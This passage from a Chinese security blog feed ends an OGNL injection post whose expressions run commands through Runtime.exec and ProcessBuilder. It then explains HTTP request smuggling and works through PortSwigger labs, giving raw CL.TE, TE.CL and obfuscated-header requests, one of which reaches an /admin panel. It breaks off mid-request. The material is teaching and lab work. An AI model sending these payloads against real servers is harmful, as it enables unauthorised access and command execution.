class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//获取context里面的变量</span><br><span class="line"> #user</span><br><span class="line"> #user.name</span><br><span class="line"></span><br><span class="line">//使用runtime执行系统命令</span><br><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用processbuilder执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br><span class="line"></span><br><span class="line">//获取当前路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br></pre></td></tr></table></figure><h2 id="0x04-Struts2中OGNL执行过程分析"><a href="#0x04-Struts2中OGNL执行过程分析" class="headerlink" title="0x04 Struts2中OGNL执行过程分析"></a>0x04 Struts2中OGNL执行过程分析</h2><p>有时间再调试分析，可参考：<a href="https://paper.seebug.org/794/#0x02-ognl" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p><h2 id="0x05-OGNL攻防史"><a href="#0x05-OGNL攻防史" class="headerlink" title="0x05 OGNL攻防史"></a>0x05 OGNL攻防史</h2><p>有时间再详细分析，可参考：<a href="https://paper.seebug.org/794/#0x03-ognl" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://c.biancheng.net/view/4131.html" target="_blank" rel="noopener">OGNL</a></p><p><a href="http://p0desta.com/2019/04/06/从零开始java代码审计系列(三" target="_blank" rel="noopener">OGNL表达式注入分析</a>/)</p><p><a href="https://paper.seebug.org/794/" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="OGNL注入" scheme="https://www.mi1k7ea.com/tags/OGNL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析HRS漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/11/%E6%B5%85%E6%9E%90HRS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/11/浅析HRS漏洞/</id>
    <published>2020-03-11T15:59:05.000Z</published>
    <updated>2020-03-15T15:41:01.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>主要参考：<a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p><p>实验环境：<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p>BurpSuite插件http-request-smuggler：<a href="https://github.com/portswigger/http-request-smuggler" target="_blank" rel="noopener">https://github.com/portswigger/http-request-smuggler</a></p><p>推荐一些深入浅出的好文：</p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p><p>HRS扫描原理及实现：</p><p><a href="https://blog.riskivy.com/%E6%B5%81%E9%87%8F%E5%A4%B9%E5%B8%A6http-request-smuggling-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">流量夹带(HTTP Request Smuggling) 检测方案的实现</a></p><h2 id="0x01-HRS简介"><a href="#0x01-HRS简介" class="headerlink" title="0x01 HRS简介"></a>0x01 HRS简介</h2><p>HRS全称Http Request Smuggling即HTTP请求走私。HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术，其允许攻击者绕过安全控制，获得对敏感数据的未经授权的访问，并直接危害其他应用程序用户。此外，还可以结合XSS、Web缓存中毒等深入利用。</p><p>HRS最早于2005年就被发现了，但因利用方式和危害影响所限被一直忽视。直至最近几年因为重视敏感信息的窃取以及利用新方法的提出才被重新提及。</p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>简单地说，<strong>HRS漏洞的根源在于前端服务器和后端服务器对HTTP请求解析存在二义性</strong>。</p><h3 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><blockquote><p>当今的Web应用程序经常在用户和最终应用程序逻辑之间使用HTTP服务器链，即用户将请求发送到前端服务器（有时称为负载均衡器或反向代理），此服务器将请求转发给一个或多个后端服务器。</p><p>当前端服务器将HTTP请求转发到后端服务器时，通常会通过相同的后端网络连接发送多个请求，因为这样做的效率和性能要高得多。协议非常简单：一个接一个地发送HTTP请求，接收服务器解析HTTP请求头，以确定一个请求的结束位置和下一个请求开始的位置：</p></blockquote><p><img src="/2020/03/11/浅析HRS漏洞/1.png" alt=""></p><blockquote><p>在这种情况下，前端和后端服务器必须就请求之间的边界达成一致。否则，攻击者可能会发送由前端服务器和后端服务器不同解释的模糊请求：</p></blockquote><p><img src="/2020/03/11/浅析HRS漏洞/2.png" alt=""></p><blockquote><p>在这里，攻击者将其前端请求的一部分由后端服务器解释为下一个请求的开始。它有效地优先于下一个请求，因此可能会干扰应用程序处理该请求的方式。这是一次请求走私攻击，可能会造成毁灭性的后果。</p></blockquote><h3 id="两个HTTP头字段"><a href="#两个HTTP头字段" class="headerlink" title="两个HTTP头字段"></a>两个HTTP头字段</h3><p>大多数HRS漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：</p><ul><li>Content-Length（后面简称CL）</li><li>Transfer-Encoding（后面简称TE）</li></ul><p>CL头很常见，它指定消息体的长度（以字节为单位），比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure><p>TE头即传输编码标头，用于指定消息主体使用分组编码。这意味着消息体包含一个或多个数据块。每个块包含以字节为单位的块大小（以十六进制表示），后面是换行符，后面是块内容。消息以0大小的块结束。</p><p>chunk传输数据格式如下，其中size的值由16进制表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意：许多安全测试人员不知道可以在HTTP请求中使用TE的原因有二：</p><ul><li>BurpSuite自动解压分组编码，使消息更易于查看和编辑；</li><li>浏览器通常不会在请求中使用TE，而且通常只在服务器响应中看到；</li></ul><h3 id="二义性造就HRS"><a href="#二义性造就HRS" class="headerlink" title="二义性造就HRS"></a>二义性造就HRS</h3><p>如果一个HTTP请求包含了两个标注请求结束位置不一致的头字段会怎么样呢？</p><p>假设前端优先考虑第一个CL，后端优先考虑第二个CL。从后端角度看，TCP的流程可能是以下这样的：</p><p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p><p>在这个例子中，注入的“G”将攻击绿色用户的请求，他们可能会得到类似于“Unknown method GPOST”的响应。这就是因为前后端服务器对于HTTP请求的结束位置头字段解析的二义性导致的HRS问题。</p><p>而在现实中，双CL很少被使用，因为许多系统会明确地拒绝具有多个CL的请求。相反，我们将使用TE攻击系统，不过前提是使用RFC 2616规范。TE是HTTP1.1协议中定义的Web用户向服务器提交数据的一种方法，当服务器收到chunked编码方式的数据时会分配一个缓冲区存放之，如果提交的数据大小未知，客户端会以一个协商好的分块大小向服务器提交数据。</p><p>如果接收到的消息同时具有TE头字段和CL头字段，则必须忽略CL头字段。由于RFC 2616规范默许可以使用<code>Transfer-Encoding: chunked</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。</p><p>比如前端服务器支持CL，后端服务器支持TE，发送如下请求：</p><p><img src="/2020/03/11/浅析HRS漏洞/4.png" alt=""></p><p>由于前端服务器不支持TE而后端服务器支持，从而导致”G”注入到了绿色用户的请求，使得HRS攻击成功。</p><p>同理，前端服务器支持TE，后端服务器支持CL的例子如下，只需将两个头结束位置的设置颠倒一下即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/5.png" alt=""></p><h2 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h2><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>CL.TE即前端服务器使用Content-Length头，后端服务器是使用Transfer-Encoding头。</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure><p>前端服务器处理CL头并确定请求正文长度为13字节，直到“SMUGGLED”结束，并将此请求转发到后端服务器。但后端服务器处理TE头，因此将消息体视为使用分块编码。它按序处理数据块，但第一个块就为<code>0\r\n\r\n</code>数据块，因此处理终止，后续消息体“SMUGGLED”将不会被执行处理，后端服务器将这些字节视为序列中下一个请求的开始。此时，如果前端服务器继续向后端服务器转发请求，那么后端服务器下一个接收到的请求就会是：SMUGGLED+POST=SMUGGLEDPOST的请求方法，这样，后端服务器会返回响应：Unknown method SMUGGLEDPOST。</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>TE.CL即前端服务器使用Transfer-Encoding头，后端服务器是使用Content-Length头。</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>这种情况下，前端服务器支持TE，会将消息体视为分块编码方式，它处理第一个长度为8字节的数据块，内容是SMUGGLED，之后解析处理第二个块，它是0长度，因此解析终止。该请求转发到后端服务器之后，由于后端服务器采用CL，按照其中请求主体长度的3个字节，解析会执行到8之后的行开头，所以SMUGGLED及以下的内容就不会被处理，侯丹服务器会将余下内容视为请求序列中下一个请求的起始。</p><p>注意：要使用BurpSuite的Repeater发送此请求，首先需要转到Reperter菜单中确保未选中“UpdateContent-Length”选项。此外，还需要包含尾随序列0后面的\r\n\r\n。</p><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>TE.TE即前端和后端服务器都支持采用Transfer-Encoding头，但其中一台服务器可以通过某种方式混淆报头，从而避免对其进行处理。从某种意义上还是CL.TE或TE.CL。</p><p>这里主要用到混淆TE头的技巧，包括但不限于如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL.CL"></a>CL.CL</h3><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>就这种情况而言，一般都是无法利用了。但是总有服务器不会严格的实现该规范，假设前端服务器和后端服务器在收到类似的请求时，都不会返回400错误，但是前端服务器按照第一个CL的值对请求进行处理，而后端服务器按照第二个CL的值进行处理，这样同样存在HRS漏洞，如前面漏洞原理中讲到的例子：</p><p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p><p>但是这种情况极其少见。</p><h2 id="0x04-漏洞案例与组合拳"><a href="#0x04-漏洞案例与组合拳" class="headerlink" title="0x04 漏洞案例与组合拳"></a>0x04 漏洞案例与组合拳</h2><h3 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>构造报文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: acf61f721e2f15be80da0791004a0040.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>发送两次即可成功得到GPOST错误响应：</p><p><img src="/2020/03/11/浅析HRS漏洞/6.png" alt=""></p><p>这是因为前端服务器只认CL头，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>当请求包经过前端服务器转发给后端服务器时，后端服务器只认TE头，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求，服务器在解析时当然会产生报错了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>首先我们构造如下报文，注意0之后必须要有两个回车：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>发送两次之后得到的是“G0POST”而非“GPOST”：</p><p><img src="/2020/03/11/浅析HRS漏洞/7.png" alt=""></p><p>要达到题目要求，那么我们修改下请求，中间再夹杂一个报文请求即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意，这里GPOST前面的12即是满足chunk格式的十六进制数，指明后面<code>GPOST / HTTP/1.1\r\n</code>的字节数即为0x12=18。</p><p>由于前端服务器处理TE头，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对前端服务器来说是一个完整的请求，然后转发给后端服务器；后端服务器处理CL头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>发送两次报文即可成功报错：</p><p><img src="/2020/03/11/浅析HRS漏洞/8.png" alt=""></p><h3 id="TE-TE-1"><a href="#TE-TE-1" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>题目要求：本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>构造报文如下，经过多种混淆TE头的测试，如下这种形式可行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac201f121ec32767801f0d6a00ff0062.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>这里混淆了TE头。前端服务器能够正常解析这个TE头，将<code>0\r\n\r\n</code>之前的内容都传递给后端服务器；而后端服务器并不能正常解析这个TE头，导致只能解析CL头获取得到请求体大小为4，即只获取了<code>12\r\n</code>的内容，而这之后的“GPOST”开头的内容则放到缓存中和下一个请求合并一起解析，从而成功导致GPOST请求失败。</p><p>发送两次报文即可成功报错：</p><p><img src="/2020/03/11/浅析HRS漏洞/9.png" alt=""></p><h3 id="绕过前端服务器的安全控制"><a href="#绕过前端服务器的安全控制" class="headerlink" title="绕过前端服务器的安全控制"></a>绕过前端服务器的安全控制</h3><blockquote><p>在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制。</p></blockquote><h4 id="CL-TE场景绕过"><a href="#CL-TE场景绕过" class="headerlink" title="CL.TE场景绕过"></a>CL.TE场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p><p>先直接用CL.TE的构造报文，改下请求/admin接口即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></table></figure><p>需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个<code>\r\n</code>不能丢弃。</p><p>发送两次，看到是向/admin接口访问了，但是返回说需要本地才能访问：</p><p><img src="/2020/03/11/浅析HRS漏洞/10.png" alt=""></p><p>在前面构造的报文中添加<code>Host: localhost</code>头字段即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 45</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 